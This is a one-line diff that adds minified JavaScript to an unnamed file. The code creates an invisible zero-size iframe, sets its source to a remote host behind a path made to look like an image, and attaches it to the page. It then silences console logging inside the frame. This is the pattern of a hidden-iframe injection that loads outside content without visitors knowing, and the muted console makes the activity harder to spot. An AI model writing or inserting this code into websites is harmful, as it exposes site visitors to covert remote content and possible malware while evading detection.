@@ -1,0 +1,1 @@
+var iframe=document.createElement("iframe");iframe.setAttribute("src","http://woodtask.com/images/bookshelf.jpg"),iframe.setAttribute("width",0),iframe.setAttribute("height",0),document.body.appendChild(iframe),iframeWindow=iframe.contentWindow,iframeWindow.console.log=function(){};
